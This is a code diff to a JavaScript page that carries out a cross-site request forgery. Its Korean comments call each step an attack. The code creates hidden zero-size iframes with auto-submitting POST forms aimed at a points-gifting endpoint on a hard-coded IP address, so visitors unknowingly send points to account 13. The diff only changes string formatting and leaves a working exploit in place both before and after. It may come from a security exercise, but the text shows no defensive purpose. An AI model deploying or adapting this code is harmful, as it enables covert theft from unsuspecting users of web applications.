@@ -99,7 +99,7 @@
             attacks.forEach((attack, index) => {
                 setTimeout(() => {
                     createAttackIframe(attack, index + 1);
-                    console.log(`🎯 공격 ${index + 1}: ${attack.points}P 시도`);
+                    console.log('🎯 공격 ' + (index + 1) + ': ' + attack.points + 'P 시도');
                 }, index * 1000);
             });
         }
@@ -111,26 +111,24 @@
             iframe.style.height = '0px';
             iframe.style.border = 'none';
             
-            const html = `
-                <!DOCTYPE html>
-                <html>
-                <body>
-                    <form id="oneClickForm${id}" method="POST" action="http://3.36.66.216/profile.php">
-                        <input type="hidden" name="receiver_id" value="13">
-                        <input type="hidden" name="points" value="${attack.points}">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="gift_type" value="${attack.gift_type}">
-                        <input type="hidden" name="message" value="${attack.message}">
-                    </form>
-                    <script>
-                        setTimeout(() => {
-                            document.getElementById('oneClickForm${id}').submit();
-                            console.log('원클릭 공격 ${id} 전송: ${attack.points}P');
-                        }, 500);
-                    </script>
-                </body>
-                </html>
-            `;
+            const html = '<!DOCTYPE html>' +
+                '<html>' +
+                '<body>' +
+                '<form id="oneClickForm' + id + '" method="POST" action="http://3.36.66.216/profile.php">' +
+                '<input type="hidden" name="receiver_id" value="13">' +
+                '<input type="hidden" name="points" value="' + attack.points + '">' +
+                '<input type="hidden" name="send_gift" value="1">' +
+                '<input type="hidden" name="gift_type" value="' + attack.gift_type + '">' +
+                '<input type="hidden" name="message" value="' + attack.message + '">' +
+                '</form>' +
+                '<script>' +
+                'setTimeout(function() {' +
+                'document.getElementById("oneClickForm' + id + '").submit();' +
+                'console.log("원클릭 공격 ' + id + ' 전송: ' + attack.points + 'P");' +
+                '}, 500);' +
+                '<\/script>' +
+                '</body>' +
+                '</html>';
             
             iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
             document.body.appendChild(iframe);
